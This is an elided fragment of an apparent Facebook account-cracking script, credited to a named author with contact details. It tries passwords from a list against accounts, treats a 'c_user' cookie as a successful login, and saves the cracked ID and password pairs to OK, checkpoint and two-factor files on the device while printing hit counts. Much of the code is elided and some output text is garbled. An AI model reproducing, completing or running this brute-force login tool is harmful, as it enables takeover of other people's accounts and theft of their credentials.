...
AUTHOR    : Qasim Brohi
FACEBOOK : Muhammad Qasim
WHATSAPP : 03079224281
VERSION    : 1.1
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/Qasim-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                print(f'\r{Red}[Ã—]--------------------[Brohi-CP]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')

                open('/sdcard/Qasim-CP.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                open('/sdcard/Qasim-2F.txt', 'a').write(cid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r\33[1;37m[QASIM] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
